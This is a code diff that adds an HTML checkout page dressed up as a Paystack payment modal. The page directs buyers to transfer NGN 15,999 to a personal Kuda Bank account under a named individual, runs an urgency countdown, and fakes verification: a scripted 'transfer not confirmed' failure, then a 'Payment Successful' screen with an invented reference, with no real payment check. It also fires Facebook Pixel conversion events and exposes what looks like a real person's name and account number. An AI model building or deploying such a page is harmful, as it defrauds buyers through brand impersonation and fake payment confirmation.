@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout</title>
+
+    <!-- Facebook Pixel -->
+    <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+    document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1116718087126870&ev=PageView&noscript=1"/></noscript>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* ===== MODAL CONTAINER ===== */
+        .ps-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.4);
+            z-index: 999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .ps-checkout {
+            position: relative;
+            z-index: 1000;
+            overflow: hidden;
+            background: #fff;
+            width: 490px;
+            max-width: 100vw;
+            min-height: 420px;
+            border-radius: 5px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.15);
+            display: flex;
+        }
+
+        /* ===== SIDEBAR (desktop only) ===== */
+        .ps-sidebar {
+            width: 130px;
+            background: #f9f9f9;
+            border-right: 1px solid #eee;
+            padding: 20px 0;
+            flex-shrink: 0;
+        }
+
+        .ps-sidebar-title {
+            font-size: 10px;
+            font-weight: 600;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+        }
+
+        .ps-sidebar-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            cursor: pointer;
+            font-size: 12px;
+            color: #555;
+            border-left: 3px solid transparent;
+            transition: all 0.15s;
+        }
+
+        .ps-sidebar-item:hover {
+            background: #f0f0f0;
+        }
+
+        .ps-sidebar-item.active {
+            color: #3bb75e;
+            font-weight: 600;
+            border-left-color: #3bb75e;
+            background: #fff;
+        }
+
+        .ps-sidebar-item.disabled {
+            opacity: 0.4;
+            cursor: default;
+        }
+
+        .ps-sidebar-item svg {
+            width: 14px; height: 14px;
+            stroke: currentColor; fill: none; stroke-width: 2;
+            flex-shrink: 0;
+        }
+
+        .ps-sidebar-item.active svg { stroke: #3bb75e; }
+
+        /* ===== MAIN CONTENT ===== */
+        .ps-main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+        }
+
+        /* ===== HEADER ===== */
+        .ps-header {
+            padding: 18px 24px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .ps-logo {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            margin-top: 2px;
+        }
+
+        .ps-logo span {
+            display: block;
+            height: 3px;
+            border-radius: 1px;
+        }
+
+        .ps-logo span:nth-child(1) { width: 18px; background: #00C3F7; }
+        .ps-logo span:nth-child(2) { width: 14px; background: #0070BA; }
+        .ps-logo span:nth-child(3) { width: 10px; background: #011B33; }
+
+        .ps-header-right {
+            text-align: right;
+        }
+
+        .ps-header-email {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .ps-header-amount {
+            font-size: 13px;
+            color: #3bb75e;
+            font-weight: 600;
+            margin-top: 2px;
+        }
+
+        .ps-close {
+            flex-shrink: 0;
+            width: 24px; height: 24px;
+            border: none;
+            background: none;
+            cursor: pointer;
+            font-size: 20px;
+            color: #ccc;
+            transition: color 0.15s;
+            line-height: 24px;
+            text-align: center;
+            padding: 0;
+            margin-left: 8px;
+            margin-top: -2px;
+        }
+
+        .ps-close:hover { color: #666; }
+
+        /* ===== BODY ===== */
+        .ps-body {
+            flex: 1;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== SCREENS ===== */
+        .ps-screen { display: none; flex: 1; flex-direction: column; }
+        .ps-screen.active { display: flex; animation: psFadeIn 0.2s ease; }
+
+        @keyframes psFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* ===== EMAIL SCREEN ===== */
+        .ps-email-title {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .ps-input-group { margin-bottom: 20px; }
+
+        .ps-input-group label {
+            display: block;
+            font-size: 11px;
+            text-transform: uppercase;
+            color: #999;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        .ps-input-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .ps-input-group input:focus { border-color: #3bb75e; }
+        .ps-input-group input::placeholder { color: #bbb; }
+
+        .ps-error {
+            font-size: 13px;
+            color: #e74c3c;
+            margin-bottom: 12px;
+            display: none;
+            animation: psShake 0.3s ease;
+        }
+
+        .ps-error.show { display: block; }
+
+        @keyframes psShake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+
+        .ps-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .ps-btn-green {
+            background: #3bb75e;
+            color: #fff;
+        }
+
+        .ps-btn-green:hover { background: #34a853; }
+        .ps-btn-green:active { transform: scale(0.99); }
+
+        /* ===== METHOD SELECT SCREEN (mobile) ===== */
+        .ps-method-title {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: #999;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+        }
+
+        .ps-method-list { list-style: none; }
+
+        .ps-method-list li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 0;
+            border-bottom: 1px solid #f5f5f5;
+            cursor: pointer;
+            transition: background 0.1s;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .ps-method-list li:hover { background: #fafafa; margin: 0 -24px; padding-left: 24px; padding-right: 24px; }
+        .ps-method-list li.disabled { opacity: 0.35; cursor: default; }
+        .ps-method-list li.disabled:hover { background: none; margin: 0; padding-left: 0; padding-right: 0; }
+
+        .ps-method-list li svg {
+            width: 16px; height: 16px;
+            stroke: #888; fill: none; stroke-width: 2;
+            flex-shrink: 0;
+        }
+
+        .ps-method-list li .new-badge {
+            font-size: 9px;
+            background: #e8fbe8;
+            color: #3bb75e;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-left: 4px;
+        }
+
+        .ps-method-footer {
+            margin-top: auto;
+            padding-top: 16px;
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        /* ===== TRANSFER SCREEN ===== */
+        .ps-transfer-bar {
+            display: none; /* shown on mobile */
+            align-items: center;
+            gap: 8px;
+            padding: 12px 0;
+            margin-bottom: 8px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .ps-transfer-bar svg {
+            width: 14px; height: 14px;
+            stroke: #3bb75e; fill: none; stroke-width: 2;
+        }
+
+        .ps-transfer-bar span {
+            font-size: 13px;
+            font-weight: 600;
+            color: #3bb75e;
+        }
+
+        .ps-transfer-bar .ps-change-link {
+            margin-left: auto;
+            font-size: 12px;
+            color: #999;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        .ps-transfer-bar .ps-change-link:hover { color: #3bb75e; }
+
+        .ps-transfer-text {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin: 20px 0;
+            line-height: 1.5;
+        }
+
+        .ps-transfer-card {
+            border: 1px solid #eee;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .ps-transfer-card-header {
+            background: #fafafa;
+            padding: 10px 16px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+        }
+
+        .ps-bank-name {
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+            text-align: center;
+            padding: 14px 16px 4px;
+        }
+
+        .ps-account-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 8px 16px 14px;
+        }
+
+        .ps-account-num {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            letter-spacing: 2px;
+            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+        }
+
+        .ps-copy-icon {
+            width: 20px; height: 20px;
+            cursor: pointer;
+            opacity: 0.4;
+            transition: opacity 0.15s;
+            stroke: #333; fill: none; stroke-width: 2;
+        }
+
+        .ps-copy-icon:hover { opacity: 0.8; }
+        .ps-copy-icon.copied { stroke: #3bb75e; opacity: 1; }
+
+        .ps-expires {
+            text-align: center;
+            padding: 10px 16px;
+            font-size: 13px;
+            color: #999;
+            border-top: 1px solid #eee;
+        }
+
+        .ps-expires strong {
+            color: #666;
+            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+        }
+
+        .ps-expires.urgent { color: #dc2626; }
+        .ps-expires.urgent strong { color: #dc2626; }
+
+        .ps-btn-outline {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #555;
+            background: #fff;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.15s;
+            margin-top: 8px;
+        }
+
+        .ps-btn-outline:hover { border-color: #3bb75e; color: #3bb75e; }
+        .ps-btn-outline:disabled { opacity: 0.4; cursor: default; pointer-events: none; }
+        .ps-btn-outline.hidden { display: none; }
+
+        /* ===== FAILED ===== */
+        .ps-failed {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 8px;
+        }
+
+        .ps-fail-circle {
+            width: 56px; height: 56px;
+            background: #e74c3c;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            animation: psPop 0.3s ease;
+        }
+
+        .ps-fail-circle svg {
+            width: 28px; height: 28px;
+            stroke: #fff; fill: none; stroke-width: 2.5;
+        }
+
+        .ps-failed h3 { font-size: 15px; color: #333; font-weight: 600; }
+        .ps-failed p { font-size: 13px; color: #999; line-height: 1.5; }
+
+        .ps-btn-retry {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #555;
+            background: #fff;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.15s;
+            margin-top: 16px;
+        }
+
+        .ps-btn-retry:hover { border-color: #3bb75e; color: #3bb75e; }
+
+        /* ===== VERIFYING ===== */
+        .ps-verifying {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 16px;
+        }
+
+        .ps-spinner {
+            width: 40px; height: 40px;
+            border: 3px solid #eee;
+            border-top-color: #3bb75e;
+            border-radius: 50%;
+            animation: psSpin 0.7s linear infinite;
+        }
+
+        @keyframes psSpin { to { transform: rotate(360deg); } }
+
+        .ps-verifying h3 { font-size: 15px; color: #333; font-weight: 600; }
+        .ps-verifying p { font-size: 13px; color: #999; }
+
+        /* ===== SUCCESS ===== */
+        .ps-success {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 8px;
+        }
+
+        .ps-check-circle {
+            width: 56px; height: 56px;
+            background: #3bb75e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            animation: psPop 0.3s ease;
+        }
+
+        @keyframes psPop {
+            from { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            to { transform: scale(1); }
+        }
+
+        .ps-check-circle svg {
+            width: 28px; height: 28px;
+            stroke: #fff; fill: none; stroke-width: 2.5;
+        }
+
+        .ps-success h3 { font-size: 16px; color: #333; font-weight: 600; }
+        .ps-success .ps-success-amount { font-size: 22px; font-weight: 700; color: #333; }
+        .ps-success .ps-success-amount .cur { font-size: 13px; color: #999; }
+        .ps-success p { font-size: 12px; color: #999; }
+
+        .ps-ref {
+            font-size: 11px;
+            color: #bbb;
+            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+            margin-top: 8px;
+        }
+
+        .ps-success-btn {
+            display: inline-block;
+            margin-top: 16px;
+            text-align: center;
+            text-decoration: none;
+            width: auto;
+            padding: 12px 32px;
+        }
+
+        .ps-success-btn.hidden { display: none; }
+
+        /* ===== FOOTER ===== */
+        .ps-footer {
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .ps-footer svg {
+            width: 10px; height: 10px;
+            stroke: #bbb; fill: none; stroke-width: 2;
+        }
+
+        .ps-footer span {
+            font-size: 10px;
+            color: #bbb;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .ps-footer strong {
+            font-size: 10px;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 800;
+        }
+
+        /* ========================================
+           MOBILE RESPONSIVE
+           ======================================== */
+        @media (max-width: 520px) {
+            body { background: #fff; align-items: flex-start; }
+
+            .ps-overlay {
+                align-items: flex-end;
+                background: rgba(0,0,0,0.3);
+            }
+
+            .ps-checkout {
+                width: 100%;
+                max-width: 100%;
+                min-height: 100vh;
+                min-height: 100dvh;
+                border-radius: 0;
+                box-shadow: none;
+                flex-direction: column;
+            }
+
+            .ps-sidebar { display: none; }
+
+            .ps-transfer-bar { display: flex; }
+
+            .ps-header { padding: 14px 20px; }
+
+            .ps-body { padding: 20px; }
+
+            .ps-method-list li {
+                padding: 16px 0;
+                font-size: 15px;
+            }
+
+            .ps-account-num {
+                font-size: 22px;
+            }
+
+            .ps-btn, .ps-btn-outline {
+                padding: 14px;
+                font-size: 15px;
+            }
+
+            .ps-footer {
+                padding: 14px 20px;
+            }
+        }
+
+        /* DESKTOP: hide mobile-only elements */
+        @media (min-width: 521px) {
+            .ps-mobile-only { display: none !important; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="ps-overlay" id="overlay">
+    <div class="ps-checkout" id="checkout">
+
+        <!-- SIDEBAR (desktop) -->
+        <div class="ps-sidebar" id="sidebar">
+            <div class="ps-sidebar-title">Pay with</div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                Card
+            </div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11"/></svg>
+                Bank
+            </div>
+            <div class="ps-sidebar-item active" onclick="showTransfer()">
+                <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v3M12 14v3M16 14v3"/></svg>
+                Transfer
+            </div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+                USSD
+            </div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                Visa QR
+            </div>
+        </div>
+
+        <!-- MAIN -->
+        <div class="ps-main">
+            <!-- HEADER -->
+            <div class="ps-header" id="psHeader">
+                <div class="ps-logo">
+                    <span></span><span></span><span></span>
+                </div>
+                <div class="ps-header-right">
+                    <div class="ps-header-email" id="headerEmail">customer@email.com</div>
+                    <div class="ps-header-amount">Pay <strong id="headerAmount">NGN 1,000</strong></div>
+                </div>
+                <button class="ps-close" onclick="resetAll()">&times;</button>
+            </div>
+
+            <!-- BODY -->
+            <div class="ps-body">
+
+                <!-- Screen: Email -->
+                <div class="ps-screen active" id="screenEmail">
+                    <div class="ps-email-title">Enter your email to start the payment</div>
+                    <div class="ps-input-group">
+                        <label>Email Address</label>
+                        <input type="email" id="emailInput" placeholder="customer@email.com" autocomplete="email">
+                    </div>
+                    <div class="ps-error" id="emailError">Please enter a valid email address</div>
+                    <button class="ps-btn ps-btn-green" onclick="submitEmail()">
+                        Pay <span id="btnAmount">NGN 1,000</span>
+                    </button>
+                </div>
+
+                <!-- Screen: Choose Method (mobile only) -->
+                <div class="ps-screen ps-mobile-only" id="screenMethods">
+                    <div class="ps-method-title">Choose a payment method</div>
+                    <ul class="ps-method-list">
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                            Pay with Card
+                        </li>
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11"/></svg>
+                            Pay with Bank
+                        </li>
+                        <li onclick="showTransfer()">
+                            <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v3M12 14v3M16 14v3"/></svg>
+                            Transfer <span class="new-badge">NEW</span>
+                        </li>
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+                            Pay with USSD
+                        </li>
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                            Pay with Visa QR
+                        </li>
+                    </ul>
+                    <div class="ps-method-footer">
+                        Pick one of the payment methods above to pay <span id="methodFooterAmount">NGN 1,000</span>
+                    </div>
+                </div>
+
+                <!-- Screen: Transfer -->
+                <div class="ps-screen" id="screenTransfer">
+                    <!-- Mobile top bar -->
+                    <div class="ps-transfer-bar ps-mobile-only">
+                        <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v3M12 14v3M16 14v3"/></svg>
+                        <span>Transfer</span>
+                        <span class="ps-change-link" onclick="goToMethods()">Change</span>
+                    </div>
+
+                    <div class="ps-transfer-text">
+                        Transfer <strong id="transferAmt">NGN 1,000</strong> to
+                    </div>
+
+                    <div class="ps-transfer-card">
+                        <div class="ps-transfer-card-header" id="acctName">Paystack Checkout</div>
+                        <div class="ps-bank-name" id="bankName">Zenith Bank</div>
+                        <div class="ps-account-row">
+                            <span class="ps-account-num" id="acctNum">0001234567</span>
+                            <svg class="ps-copy-icon" id="copyIcon" onclick="copyAcct()" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                        </div>
+                        <div class="ps-expires" id="expiresRow">
+                            Expires in <strong id="timerDisplay">30:00</strong>
+                        </div>
+                    </div>
+
+                    <button class="ps-btn-outline hidden" id="confirmBtn" onclick="confirmTransfer()">I've sent the money</button>
+                </div>
+
+                <!-- Screen: Verifying -->
+                <div class="ps-screen" id="screenVerifying">
+                    <div class="ps-verifying">
+                        <div class="ps-spinner"></div>
+                        <h3>Verifying transfer</h3>
+                        <p>Hold on while we confirm your payment...</p>
+                    </div>
+                </div>
+
+                <!-- Screen: Failed -->
+                <div class="ps-screen" id="screenFailed">
+                    <div class="ps-failed">
+                        <div class="ps-fail-circle">
+                            <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+                        </div>
+                        <h3>Transfer not confirmed</h3>
+                        <p id="failedMsg">We haven't received your transfer yet. Please ensure you've completed the transfer and try again.</p>
+                        <button class="ps-btn-retry" id="retryBtn" onclick="retryTransfer()">Try again</button>
+                    </div>
+                </div>
+
+                <!-- Screen: Success -->
+                <div class="ps-screen" id="screenSuccess">
+                    <div class="ps-success">
+                        <div class="ps-check-circle">
+                            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+                        </div>
+                        <h3>Payment Successful</h3>
+                        <div class="ps-success-amount"><span class="cur" id="successCur">NGN</span> <span id="successNum">1,000</span></div>
+                        <p>A receipt has been sent to <strong id="successEmail">customer@email.com</strong></p>
+                        <div class="ps-ref" id="successRef">REF: PSK-TXN-2026XXXXXX</div>
+                        <a class="ps-btn ps-btn-green ps-success-btn hidden" id="successBtn" href="#" target="_blank">Continue</a>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- FOOTER -->
+            <div class="ps-footer">
+                <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                <span>Secured by</span>
+                <strong>PAYSTACK</strong>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// ===== CONFIG =====
+const CONFIG = {
+    merchantName: 'Paystack Checkout',
+    amount: 15999,
+    currency: 'NGN',
+    bankName: 'Kuda Bank',
+    accountNumber: '2086752640',
+    accountName: 'Adeyemi, Benjamin Opeyemi',
+    timerMinutes: 30,
+    verifyDelay: 3500,
+
+    // Facebook Pixel
+    fbPixelId: '1116718087126870',
+
+    // Página de obrigado (redirect após sucesso)
+    thankYouUrl: 'obrigado.html',        // URL da página de obrigado (local)
+
+    // Botão de próximos passos (na página de obrigado)
+    successBtnText: 'Continue',          // Texto do botão
+    successBtnUrl: '',                   // URL de redirect (vazio = sem botão)
+};
+
+let timerInterval = null;
+let remaining = CONFIG.timerMinutes * 60;
+let isMobile = window.innerWidth <= 520;
+let attempts = 0;
+let btnShowTimeout = null;
+let cooldownTimeout = null;
+let emailSubmitted = false;
+const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+
+window.addEventListener('resize', () => { isMobile = window.innerWidth <= 520; });
+
+// ===== CURRENCY CONVERSION =====
+let usdRate = null; // NGN per 1 USD
+
+async function fetchUsdRate() {
+    try {
+        const res = await fetch('https://open.er-api.com/v6/latest/USD');
+        const json = await res.json();
+        if (json.result === 'success' && json.rates && json.rates.NGN) {
+            usdRate = json.rates.NGN;
+            console.log('[FX] 1 USD =', usdRate, 'NGN');
+        }
+    } catch (e) {
+        console.warn('[FX] Failed to fetch rate, using fallback');
+        usdRate = 1500; // fallback
+    }
+}
+
+function toUsd(ngnAmount) {
+    if (!usdRate) return ngnAmount; // fallback: send as-is
+    return Math.round((ngnAmount / usdRate) * 100) / 100;
+}
+
+// ===== FACEBOOK PIXEL =====
+function initPixel() {
+    if (!CONFIG.fbPixelId || typeof fbq === 'undefined') return;
+    fbq('init', CONFIG.fbPixelId);
+    fbq('track', 'PageView');
+}
+
+function trackEvent(event, data) {
+    if (!CONFIG.fbPixelId) return;
+    if (typeof fbq !== 'function') { console.warn('[Pixel] fbq not loaded'); return; }
+
+    // Prevent duplicate events within same session
+    const key = 'ps_evt_' + sessionId + '_' + event;
+    if (sessionStorage.getItem(key)) return;
+    sessionStorage.setItem(key, '1');
+
+    // Convert to USD for Meta
+    if (data && data.currency === 'NGN' && usdRate) {
+        data.value = toUsd(data.value);
+        data.currency = 'USD';
+    }
+
+    console.log('[Pixel] Firing:', event, data);
+    if (data) {
+        fbq('track', event, data);
+    } else {
+        fbq('track', event);
+    }
+}
+
+// ===== INIT =====
+function init() {
+    const amt = fmtAmt(CONFIG.amount);
+    const full = CONFIG.currency + ' ' + amt;
+
+    qs('#headerAmount').textContent = full;
+    qs('#btnAmount').textContent = full;
+    qs('#transferAmt').textContent = full;
+    qs('#methodFooterAmount').textContent = full;
+    qs('#successCur').textContent = CONFIG.currency;
+    qs('#successNum').textContent = amt;
+    qs('#bankName').textContent = CONFIG.bankName;
+    qs('#acctNum').textContent = CONFIG.accountNumber;
+    qs('#acctName').textContent = CONFIG.accountName;
+
+    // Success button
+    if (CONFIG.successBtnUrl) {
+        const btn = qs('#successBtn');
+        btn.textContent = CONFIG.successBtnText;
+        btn.href = CONFIG.successBtnUrl;
+        btn.classList.remove('hidden');
+    }
+
+    // Facebook Pixel + USD rate
+    initPixel();
+    fetchUsdRate();
+
+    qs('#emailInput').focus();
+    qs('#emailInput').addEventListener('keydown', e => {
+        if (e.key === 'Enter') submitEmail();
+    });
+}
+
+function fmtAmt(n) {
+    return n.toLocaleString('en-NG', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
+}
+
+function qs(sel) { return document.querySelector(sel); }
+
+// ===== SCREENS =====
+function show(id) {
+    document.querySelectorAll('.ps-screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+function showEmailError() {
+    qs('#emailInput').style.borderColor = '#e74c3c';
+    qs('#emailError').classList.add('show');
+    qs('#emailInput').focus();
+    setTimeout(() => {
+        qs('#emailInput').style.borderColor = '#ddd';
+        qs('#emailError').classList.remove('show');
+    }, 3000);
+}
+
+function submitEmail() {
+    const email = qs('#emailInput').value.trim();
+    if (!email || !email.includes('@')) {
+        showEmailError();
+        return;
+    }
+    qs('#headerEmail').textContent = email;
+    emailSubmitted = true;
+
+    trackEvent('InitiateCheckout', {
+        value: CONFIG.amount,
+        currency: CONFIG.currency,
+        content_name: CONFIG.merchantName
+    });
+
+    if (isMobile) {
+        show('screenMethods');
+    } else {
+        showTransfer();
+    }
+}
+
+function showTransfer() {
+    if (!emailSubmitted) {
+        showEmailError();
+        return;
+    }
+    show('screenTransfer');
+    startTimer();
+
+    // Hide button initially, show after 60 seconds
+    const btn = qs('#confirmBtn');
+    btn.classList.add('hidden');
+    clearTimeout(btnShowTimeout);
+    btnShowTimeout = setTimeout(() => {
+        btn.classList.remove('hidden');
+    }, 60000); // 60 seconds
+}
+
+function goToMethods() {
+    stopTimer();
+    if (isMobile) {
+        show('screenMethods');
+    } else {
+        show('screenEmail');
+    }
+}
+
+function confirmTransfer() {
+    attempts++;
+    qs('#sidebar').style.display = 'none';
+    qs('#confirmBtn').classList.add('hidden');
+    show('screenVerifying');
+
+    if (attempts < 2) {
+        // Deny on 1st and 2nd attempts
+        setTimeout(() => {
+            show('screenFailed');
+        }, CONFIG.verifyDelay);
+    } else {
+        // Approve on 3rd attempt
+        stopTimer();
+        setTimeout(() => {
+            qs('#successEmail').textContent = qs('#emailInput').value.trim();
+            qs('#successRef').textContent = 'REF: PSK-TXN-' + genRef();
+            show('screenSuccess');
+            // Redirect to thank you page after short delay
+            if (CONFIG.thankYouUrl) {
+                setTimeout(() => {
+                    const params = new URLSearchParams();
+                    params.set('amount', CONFIG.amount);
+                    params.set('currency', CONFIG.currency);
+                    params.set('email', qs('#emailInput').value.trim());
+                    params.set('ref', qs('#successRef').textContent);
+                    if (usdRate) params.set('fxrate', usdRate);
+                    window.location.href = CONFIG.thankYouUrl + '?' + params.toString();
+                }, 2000);
+            }
+        }, CONFIG.verifyDelay);
+    }
+}
+
+function retryTransfer() {
+    qs('#sidebar').style.display = '';
+    show('screenTransfer');
+
+    // Hide the button, show after 30-second cooldown
+    const btn = qs('#confirmBtn');
+    btn.classList.add('hidden');
+    clearTimeout(cooldownTimeout);
+    cooldownTimeout = setTimeout(() => {
+        btn.classList.remove('hidden');
+    }, 30000); // 30 seconds
+}
+
+function resetAll() {
+    stopTimer();
+    clearTimeout(btnShowTimeout);
+    clearTimeout(cooldownTimeout);
+    remaining = CONFIG.timerMinutes * 60;
+    attempts = 0;
+    emailSubmitted = false;
+    updateTimer();
+    qs('#emailInput').value = '';
+    qs('#headerEmail').textContent = 'customer@email.com';
+    qs('#sidebar').style.display = '';
+    qs('#confirmBtn').classList.add('hidden');
+    show('screenEmail');
+    qs('#emailInput').focus();
+}
+
+// ===== TIMER =====
+function startTimer() {
+    remaining = CONFIG.timerMinutes * 60;
+    updateTimer();
+    timerInterval = setInterval(() => {
+        remaining--;
+        updateTimer();
+        if (remaining <= 300) qs('#expiresRow').classList.add('urgent');
+        if (remaining <= 0) {
+            stopTimer();
+            alert('Transfer expired. Please try again.');
+            goToMethods();
+        }
+    }, 1000);
+}
+
+function stopTimer() {
+    clearInterval(timerInterval);
+    timerInterval = null;
+    qs('#expiresRow').classList.remove('urgent');
+}
+
+function updateTimer() {
+    const m = Math.floor(remaining / 60);
+    const s = remaining % 60;
+    qs('#timerDisplay').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+}
+
+// ===== COPY =====
+function copyAcct() {
+    const icon = qs('#copyIcon');
+    navigator.clipboard.writeText(CONFIG.accountNumber).then(() => {
+        icon.classList.add('copied');
+        setTimeout(() => icon.classList.remove('copied'), 2000);
+    }).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = CONFIG.accountNumber;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        icon.classList.add('copied');
+        setTimeout(() => icon.classList.remove('copied'), 2000);
+    });
+}
+
+// ===== UTILS =====
+function genRef() {
+    return new Date().getFullYear() + Math.random().toString(36).substring(2, 8).toUpperCase();
+}
+
+init();
+</script>
+</body>
+</html>
